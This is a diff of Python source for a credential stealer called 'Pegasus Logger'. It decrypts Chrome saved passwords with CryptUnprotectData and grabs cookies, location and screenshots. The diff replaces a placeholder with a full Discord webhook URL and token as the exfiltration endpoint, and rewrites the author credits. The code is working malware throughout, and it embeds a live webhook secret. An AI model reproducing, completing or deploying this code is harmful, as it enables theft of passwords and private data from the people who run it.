@@ -19,12 +19,12 @@ from discord import Embed, File, RequestsWebhookAdapter, Webhook
 from pyautogui import screenshot
 from win32crypt import CryptUnprotectData
 
-WEBHOOK_URL = "webhook_here"
+WEBHOOK_URL = "https://discord.com/api/webhooks/958134235800158249/QwjDxnjuD82SpCnNCRmeTuPAhFMyZhjIw5QzufzlgT8bgidOUY3Lc_4Cm_TgUWjR-qyJ"
 
 def main(webhook_url):
     global webhook, embed
     
-    webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter()) # Initializing webhook
+    webhook = Webhook.from_url(webhook_url, adapter=RequestsWebhookAdapter())
     embed = Embed(title="Pegasus Logger", color=15535980)
     
     get_loc()
@@ -38,7 +38,7 @@ def main(webhook_url):
     cookiemonster()
     
     embed.set_author(name=f"@ {strftime('%D | %H:%M:%S', localtime())}")
-    embed.set_footer(text="Pegasus Logger | Made by whosaddidix?#1400")
+    embed.set_footer(text="Pegasus Logger | Made by www.addidix.xyz")
     embed.set_thumbnail(url="https://i.imgur.com/q1NJvOx.png")
     
     zipup()
@@ -334,7 +334,7 @@ class password():
     def grabPassword(self):
         master_key = self.get_master_key()
         with open("google-passwords.txt", "w") as f:
-            f.write("whosaddidix?#1400 /// Google Chrome Passwords\n\n")
+            f.write("www.addidix.xyz /// Google Chrome Passwords\n\n")
         login_db = self.appdata+'\\Google\\Chrome\\User Data\\default\\Login Data'
         try:
             copy2(login_db, "Loginvault.db")
